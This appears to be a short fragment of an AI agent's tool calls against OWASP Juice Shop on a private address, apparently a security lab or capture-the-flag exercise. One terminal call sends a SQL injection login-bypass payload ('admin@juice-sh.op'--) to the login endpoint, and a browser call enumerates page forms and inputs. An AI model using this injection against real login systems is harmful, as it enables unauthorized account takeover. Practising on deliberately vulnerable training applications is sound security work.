terminal {"command": "python3 -c "
import requests
import json

url = 'http://172.19.0.2:3000/rest/user/login'
payload = {'email': \"admin@juice-sh.op'--\", 'password': 'anything'}
headers = {'Content-Type': 'application/json'}

r = requests.post(url, json=payload, headers=headers)
print('Status:', r.status_code)
print('Response:', r.text)
try:
    print('JSON:', json.dumps(r.json(), indent=2))
except:
    print('Raw:', r.text)
"", "timeout": 15}

browser {"action": "execute_js", "javascript": "// Try to find input fields on the page
var inputs = document.querySelectorAll('input');
var result = [];
inputs.forEach(function(input) {
    result.push({
        id: input.id,
        name: input.name,
        type: input.type,
        placeholder: input.placeholder,
        class: input.className
    });
});
// Also look for the login form
var forms = document.querySelectorAll('form');
result.push({forms: forms.length});
// Check if there's an Angular component rendered
var appRoot = document.querySelector('app-root');
result.push({appRootInner: appRoot ? appRoot.innerHTML.substring(0, 500) : 'not found'});
JSON.stringify(result);"}

